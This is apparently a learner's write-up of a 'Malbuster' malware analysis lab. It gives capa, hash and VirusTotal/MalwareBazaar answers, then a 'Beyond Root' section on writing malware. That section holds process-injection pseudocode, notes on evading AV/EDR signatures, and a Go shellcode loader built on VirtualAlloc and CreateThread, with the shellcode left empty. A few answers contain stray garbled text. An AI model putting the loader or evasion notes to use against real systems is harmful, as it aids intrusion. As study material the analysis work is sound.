# Malbuster Writeup

Name: Malbuster
Date:  
Difficulty:  Medium
Goals:  
- Practice Malware Analysis and Writing
- Finish without explainantions as to the setup - they have not release the static analysis room with tools demonstration
Learnt:
- Use new tools and brain and accomplish much in 30 minutes.
Beyond Root:
- [Watch Alh4zr3d's The Black Magicks of Malware: Early-Bird QueueUserAPC Injection](https://www.youtube.com/watch?v=aMkMkkClXVc)
- Write some simple C based malware and detections for it 
- Found an additional video

## Helpful information

- Synsinternals is on the box use it 

- Start -> Flare -> TOOLS 

Performing capa.exe provides nice overview of sample include ATT&CK Tactic - the blue on blue in powershell is facepalm
```powershell
capa.exe .\Samples\malbuster_1 
```

## Answers

Based on the ARCHITECTURE of the binary, is malbuster_1 a 32-bit or a 64-bit application? (32-bit/64-bit)

Solution
```powershell
sigcheck .\Samples\malbuster_1 
```

Answer
```
32-bit
```
 
What is the MD5 hash of malbuster_1?

Solution
```
md5sum malbuster_1
```

Answer
```
4348da65e4aeae6472c7f97d6dd8ad8f
```
 
Using the hash, what is the number of detections of malbuster_1 in VirusTotal?  

Solution
```
https://www.virustotal.com/gui/file/000415d1c7a7a838ba2ef00874e352e8b43a57e2f98539b5908803056f883176
```

Answer
```
51
```
 
Based on VirusTotal detection, what is the malware signature of malbuster_2 according to Avira?  

Solution
```
md5sum .\Samples\malbuster_2
1d7ebed1baece67a31ce0a17a0320cb2
https://www.virustotal.com/gui/file/ace3a5e5849c1c00760dfe67add397775f5946333357f5f8dee25cd4363e36b6
CTRL+F AVIRA
```

Answer
```
HEUR/AGEN.1202219
```
 
malbuster_2 imports the function _CorExeMain. From which DLL file does it import this function?  

Solution
```powershell
capa.exe .\Samples\malbuster_2 -vv
# the format for import calls dll._func
```

Answer
```
mscoree.dll
```
 
Based on the VS_VERSION_INFO header, what is the original name of malbuster_2?  

Solution
```powershell
PPEE -> File info -> InternlName: 
```

Answer
```
7JYpE.exe
```
 
Using the hash of malbuster_3, what is its malware signature based on abuse.ch?  

Solution
```powershell
md5sum .\Samples\malbuster_3
47ba62ce119f28a55f90243a4dd8d324
# MalwareBazaar Search syntax
md5:47ba62ce119f28a55f90243a4dd8d324

https://bazaar.abuse.ch/browse.php?search=md5%3A47ba62ce119f28a55f90243a4dd8d324
```

Answer
```
trickbot
```
 
Using the hash of malbuster_4, what is its malware signature based on abuse.ch?  

Solution
```powershell
md5sum .\Samples\malbuster_4
061057161259e3df7d12dccb363e56f9
# MalwareBazaar Search syntax
md5:061057161259e3df7d12dccb363e56f9
https://bazaar.abuse.ch/browse.php?search=md5%3A061057161259e3df7d12dccb363e56f9
```

Answer
```
ZLoaderMalware Writing
```
 
What is the message found in the DOS_STUB of malbuster_4?

Solution
```
PPEE
Strings in file

```

Answer
```
!This Salfram cannot be run in DOS mode.
```
 
malbuster_4 imports the function ShellExecuteA. From which DLL file does it import this function?  

Solution
```
Search ShellExecuteA -> shell32.dll
```

Answer
```
shell32.dllv
```
 
Using capa, how many anti-VM instructions were identified in malbuster_1?

Solution
```
capa.exe .\Samples\malbuster_1
Virtual Machine Detection::Instruction Testing [B0009.029]                    |
Virtual Machine Detection [B0009]
Virtualization/Sandbox Evasion::System Checks [T1497.001]

```

Answer
```
3
```
 
Using capa, which binary can log keystrokes?  

Solution
```
capa all the files
```

Answer
```
malbuster_3
```
 
Using capa, what is the MITRE ID of the DISCOVERY technique used by malbuster_4?

Solution
```
As with the previous question capa.exe all the files is useful for overview
```

Answer
```
T1083
```
 
Which binary contains the string GodMode?  

Solution
```
strings .\Samples\malbuster_2 | findstr "GodMode"
```

Answer
```
malbuster_2
```
 
Which binary contains the string **Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)**?

Solution
```
strings .\Samples\malbuster_1 | findstr "Mozilla"
```

Answer
```
malbuster_1
```

## Beyond Root - Malware Writing

[Notes from Al's Video](https://www.youtube.com/watch?v=aMkMkkClXVc) - There is a series! [WOW](https://www.youtube.com/playlist?list=PLi4eaGO3umbp2TT8YnEQCWZ23YH9apnVJ), I'll start from the beginning
[The Black Magick of Malware: Process Injection with Win32 - 1](https://www.youtube.com/watch?v=LoXg1YWbDeo&list=PLi4eaGO3umbp2TT8YnEQCWZ23YH9apnVJ&index=1)

- https://github.com/Alh4zr3d/ProcessInjectionPOCs - is all written in Nim

I will write these in C and Go, because this is my brain on malware or any hacking related topic:
![](mybrainonmalware.png)
With my nicely sized undercarriage with will have Carbon written on that instead of C++ at some point I think, my brains need scaling so here we go. [Mum's the word](https://en.wikipedia.org/wiki/Mum%27s_the_word), nim seems a great choice for python brains, but the same if not better can be achieved with go or c with more brain wrinkles if they have already been acquired.
Notes
```powershell
# API acts as intermediary to interface with another system and Win32 API is this for the kernel
# dlls contain function that are abstractions of lower level syscalls

# syscall are diffcult to use and are error prones
```

A syscall
![](systemcall.png)

Processes
![](winproc.png)

![](crtvisual.png)

Meta Notes
```powershell
# Nim binaries are smaller than go - but we can lose 80-90% of size with flags and upx

// Strip debug information
GOOS=linux go build -ldflags="-s -w" cmd/go
// upx


# but go has better detection evasion features, stripping 
# Use the API

# Replicate the API functions  - smaller binary
# type declaration for compatibility
# dll to look for, return type 

# Consider targeting both architecture
# 32 bits still exist in corp 
# 32bit Subsystems for Windows 
	# Office is a 32 bit process!

# Compilation considerations
# Console or GUI shellcode

# EDR and AV evasion in the context is about bypasses signature of PAGE_EXECUTE_READ, which in the pseudo code below is in  VirtualProtect(), but could be VirtualAlloc - a common signature is would be alloc pages with PAGE_EXECUTE_READ

# VirtualAlloc 
# WaitForSingleObject

# Psuedo code notes
# * indicates pointers

if 64bit
elseif 32bit
injectCreateThread(
	VirtualAlloc() # For current process
	NULL, $shellcode_size, MEM_COMMIT, PAGE_READWRITE
	WriteProcessMemory( # Interact with a resource from baseAddr and write shellcode from its address to the end of the offset of that address
		GetCurrentProcess( *baseAddr, *ShellcodeAddr,  $shellcode_size, addr byteWritten
		)
	VirtualProtect( # Change permissions of allocated region of memory	 
	*baseAddr, $shellcode_size, PAGE_EXECUTE_READ, *prevProcess
	) 
	threadH = CreateThread( # 0s lazy let windows decide 
	NULL, 0, LPTHREAD_START_ROUTINE [](*baseAddr), 0, *threadID 
	)
	# Process will exit regardless of what our defined thread is doing
	# We need handling 
	# CloseHandle it is good practice to clsoe a handle to avoid handle leaks
	CloseHandle(threadH)
	# Pause main thread until the main thread is finished:	
	WaitForSingleObject(threadH, DWORD  dwMilliseconds)
)

# CreateRemoteThread
# Beware of picking processes if they are processes are close because our malware
GetProcessByName("explorer.exe")
# Not Win32API

GetProcessByName(processName string) DWORD {
pid DWORD 0
entry PROCESSENTRY32  
hSnapsnot HANDLE
# Loop through all pid to find a process name using the WIN32API function Process32First
Process32First(hSnapshot, *entry)
}

processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetpid)
# Extended version that also takes a process handle
VirtualAllocEx(processHandle, NULL, $shellcode_size, MEM_COMMIT, PAGE_READWRITE)

# Beware of picking processes if they are closed

```


[WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
[VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
[CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
[Process32First](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)
[CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)
[WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)

[GetCurrentProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess)
[OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)

C version - notes
```c
#include <processthreads.api>
VirtualAlloc()
WriteProcessMemory(
	GetCurrentProcess()
	)
VirtualProtect()	
CreateThread()

shellcode = []char {};
```

G notes
```go 
// Import the win32.api


```

#### CreateThread

Go version - because I also wanted to see how ChatGPT would create the scaffolding and then research my way to better code.
```go
package main

import (
	"syscall"
	"unsafe"
)

const (
	PAGE_EXECUTE_READ        = 0x20
	PAGE_READWRITE           = 0x04
	MEM_COMMIT               = 0x1000
	THREAD_CREATE_FLAGS_CREATE_SUSPENDED = 0x4
)

var (
	kernel32             = syscall.MustLoadDLL("kernel32.dll")
	VirtualAllocProc     = kernel32.MustFindProc("VirtualAlloc")
	WriteProcessMemory   = kernel32.MustFindProc("WriteProcessMemory")
	VirtualProtect      = kernel32.MustFindProc("VirtualProtect")
	CreateThread         = kernel32.MustFindProc("CreateThread")
	WaitForSingleObject  = kernel32.MustFindProc("WaitForSingleObject")
	CloseHandle          = kernel32.MustFindProc("CloseHandle")
	GetCurrentProcess    = kernel32.MustFindProc("GetCurrentProcess")
)

func injectCreateThread(shellcode []byte) error {
	baseAddr, _, _ := VirtualAllocProc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT,
		PAGE_READWRITE,
	)

	_, _, err := WriteProcessMemory.Call(
		GetCurrentProcess.Call(),
		baseAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
	)
	if err != nil {
		return err
	}

	prevPro := uint32(0)
	_, _, err = VirtualProtect.Call(
		baseAddr,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&prevPro)),
	)
	if err != nil {
		return err
	}

	threadID, _, _ := CreateThread.Call(
		0,
		0,
		baseAddr,
		0,
		0,
		0,
	)
	if threadID == 0 {
		return syscall.GetLastError()
	}

	defer CloseHandle.Call(threadID)
	_, _, err = WaitForSingleObject.Call(threadID, 0xffffffff)
	if err != nil {
		return err
	}

	return nil
}

func main() {
	// Replace the shellcode with your own code
	shellcode := []byte{}
	injectCreateThread(shellcode)
	}

```
